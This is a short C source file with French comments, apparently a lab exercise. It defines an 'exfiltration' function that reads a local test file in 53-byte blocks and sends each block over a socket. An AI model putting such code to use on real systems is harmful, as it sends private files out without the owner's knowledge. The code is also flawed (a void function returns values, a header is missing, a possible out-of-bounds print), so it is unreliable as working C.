#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "exfiltration.h"

void exfiltration(int socket_fd) {
    // Nom du fichier à lire
    const char *filename = "loreemtoextract.txt";

    // Taille d'un bloc
    size_t blockSize = 53;

    // Ouvrir le fichier en mode lecture
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        fprintf(stderr, "Erreur : impossible d'ouvrir le fichier %s\n", filename);
        return 1;
    }

    // Allocation mémoire pour un bloc
    char *block = (char *)malloc((blockSize) * sizeof(char));
    if (block == NULL) {
        fprintf(stderr, "Erreur : échec de l'allocation mémoire.\n");
        fclose(file);
        return 1;
    }

    // Lecture et affichage des blocs
    size_t bytesRead;
    while ((bytesRead = fread(block, sizeof(char), blockSize, file)) > 0) {
        if (bytesRead != blockSize){ block[bytesRead]='\0';};
       if (send(socket_fd, block, bytesRead, 0) == -1) {
            perror("Erreur lors de l'envoi du bloc");
            break;
        }
        printf("Bloc envoyé : %s\n", block); 

    }

    // Libérer la mémoire et fermer le fichier
    free(block);
    fclose(file);
}
